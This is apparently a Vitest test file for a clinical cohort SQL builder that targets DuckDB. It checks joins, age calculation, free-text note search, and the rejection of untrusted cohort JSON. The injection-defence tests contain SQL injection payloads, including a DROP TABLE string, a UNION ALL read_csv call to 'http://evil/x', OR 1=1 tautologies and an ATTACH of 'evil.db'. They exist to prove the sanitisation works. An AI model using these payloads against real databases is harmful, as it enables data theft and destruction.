import { describe, it, expect } from 'vitest'
import {
  buildCohortCountSql,
  buildCohortMembershipSql,
  buildCohortResultsSql,
  getNodeLabel,
} from './cohort-query'
import type { Cohort, CohortLevel, SchemaMapping } from '@/types'

// The membership query freezes cohort content into a snapshot (materialization).
// It must return both the level id and a patient_id, and must NOT cap rows with
// a LIMIT — a truncated snapshot would silently lose members.

const mapping: SchemaMapping = {
  patientTable: { table: 'person', idColumn: 'person_id' },
  visitTable: {
    table: 'visit',
    idColumn: 'visit_id',
    patientIdColumn: 'person_id',
    startDateColumn: 'start',
    endDateColumn: 'end',
  },
} as unknown as SchemaMapping

function makeCohort(level: CohortLevel): Cohort {
  return {
    id: 'c1',
    projectUid: 'p1',
    name: { en: 'Test', fr: 'Test' },
    description: {},
    level,
    criteriaTree: {
      kind: 'group',
      id: 'root',
      operator: 'AND',
      children: [],
      exclude: false,
      enabled: true,
    },
    schemaVersion: 4,
    createdAt: '2026-01-01',
    updatedAt: '2026-01-01',
  }
}

describe('buildCohortMembershipSql', () => {
  it('at patient level returns id + patient_id from the same column, no LIMIT', () => {
    const sql = buildCohortMembershipSql(makeCohort('patient'), mapping)!
    expect(sql).toContain('"person"."person_id" AS id')
    expect(sql).toContain('"person"."person_id" AS patient_id')
    expect(sql).not.toMatch(/LIMIT/i)
  })

  it('at visit level returns the visit id but the patient FK as patient_id', () => {
    const sql = buildCohortMembershipSql(makeCohort('visit'), mapping)!
    expect(sql).toContain('"visit"."visit_id" AS id')
    expect(sql).toContain('"visit"."person_id" AS patient_id')
  })

  it('returns null for event level (no single base table)', () => {
    expect(buildCohortMembershipSql(makeCohort('event'), mapping)).toBeNull()
  })
})

// A visit-level cohort whose criteria never touch the patient table still
// SELECTs gender/age through the `p` alias. Before the join was forced, DuckDB
// answered `Binder Error: Referenced table "p" not found!` — and because only
// this query (not the count) failed, the run looked like it had never happened.
describe('buildCohortResultsSql patient join', () => {
  const withPatientCols = {
    ...mapping,
    patientTable: {
      table: 'person',
      idColumn: 'person_id',
      genderColumn: 'gender_concept_id',
      birthYearColumn: 'year_of_birth',
    },
  } as unknown as SchemaMapping

  it('joins the patient table whenever a p.-qualified column is selected', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), withPatientCols)!
    expect(sql).toContain('INNER JOIN "person" p')
    // Every `p.` reference must be covered by that join.
    expect(sql).toMatch(/p\."gender_concept_id"/)
  })

  it('never emits a p. reference without the join', () => {
    for (const level of ['patient', 'visit'] as CohortLevel[]) {
      const sql = buildCohortResultsSql(makeCohort(level), withPatientCols)
      if (!sql) continue
      if (/\bp\."/.test(sql)) expect(sql).toContain('INNER JOIN "person" p')
    }
  })

  it('leaves the join out when the mapping exposes no patient-derived column', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), mapping)!
    expect(sql).not.toContain('INNER JOIN "person" p')
    expect(sql).not.toMatch(/\bp\."/)
  })
})

// MIMIC-IV maps both a birth date and a birth year, but person.birth_datetime is
// NULL for all 364k rows — preferring the date outright made age_at_admission
// NULL for every result.
describe('buildCohortResultsSql age column', () => {
  const withBoth = {
    ...mapping,
    patientTable: {
      table: 'person',
      idColumn: 'person_id',
      birthDateColumn: 'birth_datetime',
      birthYearColumn: 'year_of_birth',
    },
  } as unknown as SchemaMapping

  it('falls back to the birth year per row when both are mapped', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), withBoth)!
    expect(sql).toContain('COALESCE(')
    expect(sql).toContain('"birth_datetime"')
    expect(sql).toContain('"year_of_birth"')
    expect(sql).toMatch(/AS age_at_admission/)
  })

  it('emits a single expression when only one of the two is mapped', () => {
    const yearOnly = {
      ...mapping,
      patientTable: { table: 'person', idColumn: 'person_id', birthYearColumn: 'year_of_birth' },
    } as unknown as SchemaMapping
    const sql = buildCohortResultsSql(makeCohort('visit'), yearOnly)!
    expect(sql).not.toContain('COALESCE(')
    expect(sql).toContain('"year_of_birth"')
  })
})

// Free-text search over clinical notes. The generated SQL was validated against
// a real DuckDB: `word` matches "art" but not "artere", `contains` matches both,
// and quoted input cannot escape the literal.
describe('buildCohortCountSql free-text criterion', () => {
  const withNotes = {
    ...mapping,
    noteTable: {
      table: 'note',
      idColumn: 'note_id',
      patientIdColumn: 'person_id',
      visitIdColumn: 'visit_occurrence_id',
      dateColumn: 'note_datetime',
      titleColumn: 'note_title',
      textColumn: 'note_text',
    },
  } as unknown as SchemaMapping

  function textCohort(config: Record<string, unknown>): Cohort {
    const c = makeCohort('visit')
    return {
      ...c,
      criteriaTree: {
        ...c.criteriaTree,
        children: [
          {
            kind: 'criterion',
            id: 'x1',
            type: 'text',
            config,
            operator: 'AND',
            exclude: false,
            enabled: true,
          },
        ],
      },
    } as unknown as Cohort
  }

  it('stays descriptive (no filter) when no terms are given', () => {
    const sql = buildCohortCountSql(textCohort({ description: 'just a note' }), withNotes)!
    expect(sql).not.toContain('note')
    expect(sql).not.toMatch(/WHERE/)
  })

  it('matches whole words with a \\b boundary, not \\y', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['art'], mode: 'word' }] }),
      withNotes,
    )!
    expect(sql).toContain('\\bart\\b')
    // \y is the Postgres spelling; DuckDB rejects it at runtime.
    expect(sql).not.toContain('\\y')
  })

  it('does not double the regex backslashes (escSql would break \\b)', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['art'], mode: 'word' }] }),
      withNotes,
    )!
    expect(sql).not.toContain('\\\\b')
  })

  it('ANDs a title search with a body search inside one criterion', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [
          { field: 'title', terms: ['compte rendu'] },
          { field: 'text', terms: ['heparine'] },
        ],
      }),
      withNotes,
    )!
    expect(sql).toContain('"note_title"')
    expect(sql).toContain('"note_text"')
    expect(sql).toContain('EXISTS (SELECT 1 FROM "note" n')
  })

  it('ORs several terms by default and ANDs them when asked', () => {
    const or = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['a', 'b'] }] }),
      withNotes,
    )!
    expect(or).toMatch(/ILIKE[^)]*OR/)
    const and = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ['a', 'b'], anyTerm: false }],
      }),
      withNotes,
    )!
    expect(and).toMatch(/ILIKE[^)]*AND/)
  })

  it('neutralizes a quote-escape attempt in a term', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ["x'); DROP TABLE note;--"] }],
      }),
      withNotes,
    )!
    // The quote is doubled, so the payload stays inside the string literal.
    expect(sql).toContain("x''); DROP")
    // What must not appear is a SINGLE quote closing the literal early — i.e.
    // an odd number of quotes before the payload.
    expect(sql).not.toMatch(/[^']'\); DROP/)
  })

  it('treats LIKE wildcards in a term as literal characters', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['100%'] }] }),
      withNotes,
    )!
    expect(sql).toContain('100\\%')
    expect(sql).toContain("ESCAPE '\\'")
  })

  it('negates a search with NOT when excluded', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ['heparin'], exclude: true }],
      }),
      withNotes,
    )!
    expect(sql).toMatch(/NOT \(/)
  })

  it('joins searches with AND > OR precedence, like the criteria tree', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [
          { field: 'text', terms: ['a'] },
          { field: 'text', terms: ['b'], operator: 'OR' },
          { field: 'text', terms: ['c'], operator: 'AND' },
        ],
      }),
      withNotes,
    )!
    // a OR (b AND c) — the OR splits the groups, the AND binds inside one.
    expect(sql).toContain('OR')
    expect(sql).toContain('AND')
    // The note link must stay ANDed with the whole disjunction, never absorbed
    // into one branch of it (which would match unrelated patients' notes).
    expect(sql).toMatch(/n\."person_id" = "visit"\."person_id" AND .*\(/s)
  })

  it('drops a title search when the mapping has no title column', () => {
    const noTitle = {
      ...withNotes,
      noteTable: { ...withNotes.noteTable, titleColumn: undefined },
    } as unknown as SchemaMapping
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'title', terms: ['x'] }] }),
      noTitle,
    )!
    // Silently widening to every note would be worse than ignoring the search.
    expect(sql).not.toContain('EXISTS')
  })
})

// A cohort's criteria are not developer-authored: importProjectZip JSON.parses
// cohorts/*.json straight into storage with no schema validation, so every
// field below can arrive from a shared ZIP or a cloned repo carrying whatever
// the author put there. The forms coerce and constrain; import does not.
describe('criteria from an untrusted cohort JSON', () => {
  const eventMapping = {
    ...mapping,
    eventTables: {
      Measurement: {
        table: 'measurement',
        conceptIdColumn: 'measurement_concept_id',
        patientIdColumn: 'person_id',
        valueColumn: 'value_as_number',
        dateColumn: 'measurement_date',
      },
    },
  } as unknown as SchemaMapping

  function conceptCohort(config: unknown): Cohort {
    const c = makeCohort('patient')
    c.criteriaTree.children = [
      { kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false, config },
    ] as never
    return c
  }

  function durationCohort(config: unknown): Cohort {
    const c = makeCohort('visit')
    c.criteriaTree.children = [
      { kind: 'criterion', id: 'x', type: 'duration', enabled: true, operator: 'AND', exclude: false, config },
    ] as never
    return c
  }

  it('drops an occurrence count that is not a number', () => {
    // Unguarded this closed the HAVING and appended a UNION ALL ... read_csv(),
    // i.e. an outbound-egress channel out of a "cohort definition".
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        occurrenceCount: { operator: '>=', count: "1 UNION ALL SELECT 1 FROM read_csv('http://evil/x')" },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('read_csv')
    expect(sql).not.toContain('UNION ALL')
  })

  it('drops an occurrence operator outside the declared union', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        occurrenceCount: { operator: '>= 0 OR 1=1 --', count: 2 },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a value filter whose bound is not a number', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: '>', value: '0 OR 1=1' }],
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a value filter whose operator is not a comparison', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: 'IS NOT NULL OR 1=1 --', value: 0 }],
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a legacy single value filter that is not numeric', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilter: { operator: '>', value: '1; ATTACH \'evil.db\' AS e' },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('ATTACH')
  })

  it('drops non-numeric duration bounds', () => {
    const sql = buildCohortCountSql(
      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: '0 OR 1=1' }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('still emits the filters when the values are legitimate', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: '>=', value: 3 }, { operator: 'between', value: 1, value2: 9 }],
        occurrenceCount: { operator: '>=', count: 2 },
      }),
      eventMapping,
    )!
    expect(sql).toContain('"value_as_number" >= 3')
    expect(sql).toContain('BETWEEN 1 AND 9')
    expect(sql).toContain('HAVING COUNT(*) >= 2')
  })

  it('keeps a valid duration range, parenthesized so an OR group cannot split it', () => {
    const sql = buildCohortCountSql(
      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: 2, maxDays: 10 }),
      eventMapping,
    )!
    expect(sql).toMatch(/\(DATE_DIFF\('day'.*>= 2 AND DATE_DIFF\('day'.*<= 10\)/s)
  })
})

// An attrition step is labelled from the criterion that produced it. A sex
// criterion stores gender CONCEPT IDS, and which id means what belongs to the
// mapping — so the label must resolve them, or the chart reads "Sex: 8532".
describe('getNodeLabel — sex', () => {
  const omop = { genderValues: { male: '8507', female: '8532', unknown: '0' } } as SchemaMapping
  const node = (values: string[], exclude = false) =>
    ({ kind: 'criterion', type: 'sex', config: { values }, exclude }) as unknown as Parameters<typeof getNodeLabel>[0]

  it('names the concept ids the picker offered', () => {
    expect(getNodeLabel(node(['8532']), omop)).toBe('Sex: Female')
    expect(getNodeLabel(node(['8507']), omop)).toBe('Sex: Male')
    expect(getNodeLabel(node(['0']), omop)).toBe('Sex: Unknown')
  })

  it('keeps every selected value, in order', () => {
    expect(getNodeLabel(node(['8507', '8532']), omop)).toBe('Sex: Male, Female')
  })

  it('resolves against the mapping, not a hard-coded OMOP table', () => {
    // MIMIC stores letters, eHOP digits: the same id means different things.
    const mimic = { genderValues: { male: 'M', female: 'F' } } as SchemaMapping
    expect(getNodeLabel(node(['F']), mimic)).toBe('Sex: Female')
    // 8532 is not a gender value here, so it is left as-is rather than mislabelled.
    expect(getNodeLabel(node(['8532']), mimic)).toBe('Sex: 8532')
  })

  it('falls back to the raw value with no mapping', () => {
    expect(getNodeLabel(node(['8532']))).toBe('Sex: 8532')
  })

  it('keeps the exclusion prefix', () => {
    expect(getNodeLabel(node(['8532'], true), omop)).toBe('NOT Sex: Female')
  })
})
